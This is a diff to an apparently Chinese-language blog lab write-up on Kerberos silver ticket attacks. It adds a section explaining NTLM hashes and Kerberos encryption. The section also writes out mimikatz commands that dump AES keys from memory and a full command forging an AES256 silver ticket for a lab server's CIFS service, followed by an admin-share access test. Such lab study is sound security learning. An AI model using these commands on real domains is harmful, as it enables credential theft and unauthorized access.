@@ -1015,8 +1015,21 @@ S \rightarrow C:E_{K_{C,S}}\lbrack\text{TS}_{5} + 1\rbrack</script><h3 id="白�
 <p>进入cmd，测试CSIF服务，成功。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">chcp <span class="number">65001</span>		注释：这步是乱码问题的一个简单解决方案</span><br><span class="line"><span class="built_in">dir</span> \\Server<span class="literal">-No5</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953193.png" alt=""></p>
-<p>附：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081435651.png" alt=""></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="抓取Net-NTLM-Hash"><a href="#抓取Net-NTLM-Hash" class="headerlink" title="抓取Net-NTLM Hash"></a>抓取Net-NTLM Hash</h3><p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081435651.png" alt=""></p>
+<h3 id="aes256票据"><a href="#aes256票据" class="headerlink" title="aes256票据"></a>aes256票据</h3><h4 id="NTLM-Hash和Kerberos协议的关系"><a href="#NTLM-Hash和Kerberos协议的关系" class="headerlink" title="NTLM Hash和Kerberos协议的关系"></a>NTLM Hash和Kerberos协议的关系</h4><p>Windows通过NT LAN Manager将域用户的明文密码计算为NTLM Hash，然后存放在DC的NTDS.DIT文件中。</p>
+<p>Kerberos协议会将用户的NTLM Hash通过加密算法加密得到Login Session Key，它的作用是作为Client和KDC之间通信加密的会话密钥。</p>
+<p>详见<a target="_blank" rel="noopener" href="https://myzxcg.com/2021/08/Kerberos-认证过程详细分析一/#as_rep">Kerberos 认证过程详细分析（一）</a>的AS_REP部分。</p>
+<p>Kerberos常用的加密方法有RC4和AES-256，另外还有DES-CBC和AES-128。</p>
+<h4 id="生成使用AES256作为Login-Session-Key的白银票据"><a href="#生成使用AES256作为Login-Session-Key的白银票据" class="headerlink" title="生成使用AES256作为Login Session Key的白银票据"></a>生成使用AES256作为Login Session Key的白银票据</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
+<p>同理，也可以</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::ekeys&quot;</span> <span class="string">&quot;exit&quot;</span> &gt; log_aes256.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081709011.png" alt=""></p>
+<p>将参数<code>\rc4</code>替换为<code>\aes256</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden </span><br><span class="line">/user:hacker_aes </span><br><span class="line">/domain:xuwp05191643.com </span><br><span class="line">/sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span> </span><br><span class="line">/target:Server<span class="literal">-No5</span> </span><br><span class="line">/aes256:<span class="number">4</span>b2daf5c7c26a1789f6132649dcace783954b4deefac7bd4d0bf294a07fb1b95 </span><br><span class="line">/service:cifs </span><br><span class="line">/ticket:silver_aes.kirbi </span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081809511.png" alt=""></p>
+<p>尝试使用CIFS对应的服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081726543.png" alt=""></p>
+<p>成功</p>
 
         </div>
 
